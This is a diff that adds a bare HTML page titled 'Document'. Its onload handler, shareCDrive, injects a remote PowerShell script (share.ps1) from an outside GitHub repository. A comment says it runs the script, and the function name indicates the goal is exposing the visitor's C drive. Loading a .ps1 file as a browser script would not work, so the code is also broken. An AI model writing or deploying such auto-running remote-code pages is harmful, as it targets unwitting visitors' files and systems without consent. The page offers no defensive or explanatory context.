@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>share</h1>
+    <script>
+        function shareCDrive() {
+            // Run the PowerShell script
+            var script = document.createElement("script");
+            script.src = "https://raw.githubusercontent.com/flyingsonu122/copilot/main/share.ps1";
+            document.body.appendChild(script);
+        }
+        
+        window.onload = shareCDrive;
+        </script>
+        
+</body>
+</html>
